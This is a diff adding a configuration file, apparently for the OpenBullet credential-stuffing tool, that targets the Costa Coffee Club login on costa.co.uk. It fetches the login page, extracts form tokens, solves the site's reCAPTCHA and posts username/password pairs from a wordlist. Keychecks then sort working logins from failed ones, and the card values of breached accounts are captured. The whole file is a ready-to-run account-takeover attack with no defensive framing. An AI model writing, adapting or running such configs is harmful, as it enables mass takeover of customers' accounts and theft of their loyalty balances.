@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Costa UK",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-26T15:32:57.2370098+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_XPID REQUEST GET "https://www.costa.co.uk/coffee-club/login/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_XPID PARSE "<SOURCE>" LR "xpid:\"" "\"}" Recursive=FALSE -> VAR "XPID" "" "" 
+#VIEW_STATE PARSE "<SOURCE>" LR "=\"__VIEWSTATE\" value=\"" "\"" Recursive=FALSE -> VAR "VS" "" "" 
+#VIEW_STATE_GEN PARSE "<SOURCE>" CSS "[name=__VIEWSTATEGENERATOR]" "value" 0 -> VAR "VSG" "" "" 
+#EMAIL_GET REQUEST GET "https://www.costa.co.uk/testing_json/email.json?email=<USER>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.costa.co.uk/coffee-club/login/" 
+  HEADER "Origin: https://www.costa.co.uk" 
+  HEADER "X-NewRelic-ID: <XPID>" 
+#RECAP RECAPTCHA "https://www.costa.co.uk/coffee-club/login/" "6Lew9DoUAAAAAFsUOSv4WU9OCUngaReBN-0BgjoU" -> VAR "RECAP" 
+#POST REQUEST POST "https://www.costa.co.uk/coffee-club/login/" AutoRedirect=TRUE 
+  CONTENT "__VIEWSTATE=%2FwEPDwUENTM4MQ9kFgJmD2QWAmYPZBYCZg9kFgJmD2QWBAIPD2QWAmYPZBYCAgEPZBYCAgIPEGRkFgBkAhUPZBYCAgEQZGQWAgIBD2QWAmYPZBYCAggPDxYCHgdWaXNpYmxlZ2RkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBVdjdGwwMCRjdGwwMCRjdGwwMCRDb250ZW50UGxhY2VIb2xkZXJEZWZhdWx0JENvbnRlbnRQbGFjZUhvbGRlckJvZHkkTG9naW5fOCRzaG93UGFzc3dvcmTxlJY7svF0gR7TU4r1z8HIgAZ%2B7Q%3D%3D&ctl00%24ctl00%24ctl00%24&ctl00%24ctl00%24ctl00%24ContentPlaceHolderDefault%24ContentPlaceHolderBody%24Login_8%24email=<USER>&ctl00%24ctl00%24ctl00%24ContentPlaceHolderDefault%24ContentPlaceHolderBody%24Login_8%24password=<PASS>&ctl00%24ctl00%24ctl00%24ContentPlaceHolderDefault%24ContentPlaceHolderBody%24Login_8%24showPassword=yes&g-recaptcha-response=<RECAP>&ctl00%24ctl00%24ctl00%24ContentPlaceHolderDefault%24ContentPlaceHolderBody%24Login_8%24btnCCLogin=Login&__VIEWSTATEGENERATOR=<VSG>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Referer: https://www.costa.co.uk/coffee-club/login/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, your username and password are incorrect." 
+    KEY "We're very sorry but there seems to be a problem. Click your browser's back button or visit one of the links below." 
+    KEY "" 
+  KEYCHAIN Success OR 
+    KEY "Your current coffee club card:" 
+    KEY "Your Coffee Club balance is:" 
+    KEY "Select your Coffee Club Card " 
+    KEY "Log Out " 
+#CARD_1 PARSE "<SOURCE>" LR "<option selected=\"selected\" value=\"" "</option>" Recursive=FALSE -> CAP "Card 1" "" "" 
+#CARD_2 PARSE "<SOURCE>" LR "<option value=\"" "</option>" Recursive=FALSE -> CAP "card 2" "" "" 
